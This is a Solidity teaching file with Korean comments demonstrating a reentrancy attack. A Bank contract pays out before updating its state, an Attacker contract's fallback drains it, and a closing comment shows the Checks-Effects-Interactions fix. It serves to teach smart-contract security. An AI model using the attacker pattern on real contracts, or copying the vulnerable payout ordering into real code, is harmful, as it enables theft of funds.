pragma solidity ^0.6.0;

/* 시나리오: Bank가 사용자들에게 10 ether씩 지급 */

contract Bank {
    mapping (address => bool) private alreadyReceivedFund;
 
    constructor() public payable {				        // 배포시 전달되는 ether를 받기 위해 payable로 선언
    }
    
    function checkBankBalance()                         // Bank 계정의 ether 잔고를 확인
        public view returns (uint256) 
    {	
        return address(this).balance;
    }
    
    function checkUserState(address user)               // 사용자 계정이 이미 ether를 지급받았는지 검사
        public view returns (bool)                      // false: 미지급, true: 지급
    {	
        return alreadyReceivedFund[user];
    }
    
    function getFreeEther(address payable user) public {
        if ((alreadyReceivedFund[user] == false)        // (1) Check: 사용자 계정이 미지급(false) 상태인지 검사
            && (address(this).balance >= 10 ether))     // Bank 계정의 잔고가 10 ether보다 큰지 검사 
        {		
            user.call {value: 10 ether} ("");			// (2) Interaction: 사용자 계정에 10 ether 송금
            alreadyReceivedFund[user] = true;			// (3) Effect: 사용자 계정의 상태를 지급(true)으로 변경
        }
    }
}

contract Attacker {
    function checkMyBalance()                           // Attacker 계정의 ether 잔고를 확인
        public view returns (uint256) 
    {	
        return address(this).balance;
    }
    
    fallback() external payable { 				        // Bank가 송금하는 ether를 수신하기 위한 fallback 함수
        address payable bankAddress = msg.sender;		// Bank의 주소를 확보
        Bank X = Bank(bankAddress);				// Bank의 주소를 Bank 컨트랙트 자료형으로 변환
        X.getFreeEther(address(this));				    // Bank의 withdraw 함수를 호출 (재귀적 호출이 반복)
    }
}

/* 컨트랙트 실행을 통한 확인
(1) Bank 배포 (50 ether 송금)
(2) checkBankBalance( ) 실행 --> 50000000000000000000
(3) Attacker 배포
(4) checkMyBalance( ) 실행 --> 00000000000000000000
(5) getFreeEther( ) 실행 (Attacker 주소 입력)
(6) checkBankBalance( ) 및 checkMyBalance( ) 실행 --> Bank: 0, Attacker: 50000000000000000000
*/

/* Reentrancy 공격에 대한 해결방법 */
    /* Checks-Effects-Interactions 패턴을 사용하여 reentrancy 버그 해결
    function getFreeEther(address payable user) public {
        if ((alreadyReceivedFund[user] == false)        // (1) Check: 사용자 계정이 미지급(false) 상태인지 검사
            && (address(this).balance >= 10 ether))     // Bank 계정의 잔고가 10 ether보다 큰지 검사 
        {		
            alreadyReceivedFund[user] = true;			// (2) Effect: 사용자 계정의 상태를 지급(true)으로 변경
            user.call {value: 10 ether} ("");			// (3) Interaction: 사용자 계정에 10 ether 송금
        }
    }
    */